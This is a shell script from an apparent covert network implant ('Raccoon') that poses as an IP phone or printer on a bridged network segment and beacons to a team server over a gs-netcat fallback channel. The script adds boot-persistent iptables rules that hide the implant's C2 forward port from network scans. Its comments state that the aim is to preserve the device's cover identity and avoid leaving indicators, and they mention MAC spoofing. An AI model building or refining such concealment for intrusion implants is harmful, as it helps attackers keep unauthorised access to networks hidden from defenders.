#!/bin/sh
# Keep the gsocket leg's local forward off the wire.
#
# The implant's side of the beacon's fifth leg is `gs-netcat -k <file> -w -p
# <local_port>`, and that `-p` binds **every interface**. Measured in upstream
# source at v1.4.43 rather than guessed:
#
#   tools/4_gs-netcat.c:1499       `case 'p':` sets gopt.port and
#                                  gopt.is_multi_peer = 1
#   tools/4_gs-netcat.c:1573-1585  the client branch (no GSC_FL_IS_SERVER)
#                                  calls fd_net_listen(gopt.listen_fd,
#                                  &gopt.port, SOCK_STREAM)
#   tools/utils.c:1238-1259        fd_net_listen() binds htonl(INADDR_ANY)
#                                  whenever *port != 0; it binds
#                                  inet_addr("127.0.0.1") only for port 0
#
# So the forward is `0.0.0.0:<local_port>`, and `gs-netcat` has no
# bind-address flag to narrow it with. Two things follow, and the second is
# the one that decides this script exists:
#
#   1. Every host on the implant's segment can reach the team server's beacon
#      socket through that forward, unauthenticated at the transport level.
#      The AES-256-GCM envelope bounds that to what a compromised listener
#      can do -- drop or replay, never read or forge -- but it is a path.
#   2. **An unexpected port listening on every interface is itself an
#      indicator.** This device is impersonating a Cisco IP phone or an HP
#      printer; neither of them answers on 16443, and one `nmap` of the
#      segment is all it takes. That cuts against the cover identity the
#      whole project is built around, which no envelope bounds.
#
# The remedy is therefore a host firewall rule, applied whether or not the
# leg is ever enabled: the leg is lazy, so the forward appears only after an
# outage, which is the worst moment to be configuring iptables.
#
#   ./gsocket_forward_firewall.sh            # apply now and at every boot
#   ./gsocket_forward_firewall.sh --apply    # apply now only (the unit does)
#
# Idempotent either way: every rule is checked with `iptables -C` before it
# is inserted, so a second run changes nothing.
#
# Scope is deliberately INPUT only. The implant bridges two interfaces and
# `bridge-nf-call-iptables` is 0, so nothing here touches forwarded traffic
# and transparent L2 bridging is unaffected.
set -eu

SELF="$(cd "$(dirname "$0")" && pwd)/$(basename "$0")"
CONFIG="${RACCOON_CONFIG:-/opt/raccoon/configs/raccoon.yaml}"
UNIT_NAME="raccoon-gsocket-forward.service"
UNIT="/etc/systemd/system/${UNIT_NAME}"
DEFAULT_PORT=16443

# The port out of `c2.fallback.gsocket.local_port`, so the rule tracks the
# configuration instead of a number remembered here. An unreadable or
# unparseable file falls back to the shipped default and says so: a rule on
# the wrong port is worse than a loud guess, and the default is what the
# shipped config carries.
port_from_config() {
    [ -r "$CONFIG" ] || return 1
    awk '
        /^    gsocket:[[:space:]]*$/ { inside = 1; next }
        inside && /^    [a-z]/ && $0 !~ /^      / { inside = 0 }
        inside && $1 == "local_port:" { print $2; exit }
    ' "$CONFIG" 2>/dev/null
}

resolve_port() {
    port="$(port_from_config || true)"
    case "$port" in
        ''|*[!0-9]*)
            echo "[!] ${CONFIG}: no usable c2.fallback.gsocket.local_port;" \
                 "using ${DEFAULT_PORT}" >&2
            port="$DEFAULT_PORT"
            ;;
    esac
    if [ "$port" -lt 1 ] || [ "$port" -gt 65535 ]; then
        echo "[!] ${CONFIG}: local_port ${port} is not a port;" \
             "using ${DEFAULT_PORT}" >&2
        port="$DEFAULT_PORT"
    fi
    echo "$port"
}

# One rule, inserted at `position` only if an identical one is not already
# there. `-C` matches the whole rule, so a changed port inserts a new rule
# and leaves the old one -- which is why `--apply` runs at every boot from a
# file an operator can edit, rather than once at install time.
ensure_rule() {
    binary="$1"
    position="$2"
    shift 2
    command -v "$binary" >/dev/null 2>&1 || return 0
    if "$binary" -C INPUT "$@" >/dev/null 2>&1; then
        return 0
    fi
    "$binary" -I INPUT "$position" "$@" || return 0
}

apply_rules() {
    port="$1"
    # The accept goes in above the drop: the beacon posts its check-in to
    # 127.0.0.1:<port> through this same chain, so a drop that preceded it
    # would take down the leg it is protecting.
    ensure_rule iptables 1 -p tcp --dport "$port" -i lo -j ACCEPT
    ensure_rule iptables 2 -p tcp --dport "$port" -j DROP
    # IPv6 is disabled on the implant image, so this is belt and braces for
    # a host where it is not.
    ensure_rule ip6tables 1 -p tcp --dport "$port" -i lo -j ACCEPT
    ensure_rule ip6tables 2 -p tcp --dport "$port" -j DROP
    echo "[+] gsocket forward on ${port} is reachable from this host only"
}

install_unit() {
    # A filter rule does not survive a reboot on its own and this image
    # installs no iptables-persistent, so it is reapplied at boot -- the way
    # raccoon-macspoof.service is installed, and before any interface comes
    # up, which is the right order for a rule that closes a port.
    cat > "$UNIT" <<UNITEOF
[Unit]
Description=Raccoon implant — keep the gsocket forward off the wire
Before=network-pre.target
Wants=network-pre.target

[Service]
Type=oneshot
RemainAfterExit=yes
ExecStart=${SELF} --apply

[Install]
WantedBy=network-pre.target
UNITEOF
    systemctl daemon-reload 2>/dev/null || true
    systemctl enable "$UNIT_NAME" 2>/dev/null || true
    echo "[+] ${UNIT_NAME} installed (reapplies the rule at every boot)"
}

if [ "$(id -u)" -ne 0 ]; then
    echo "[!] Must run as root (iptables)" >&2
    exit 1
fi

PORT="$(resolve_port)"
apply_rules "$PORT"
if [ "${1:-}" != "--apply" ]; then
    install_unit
fi
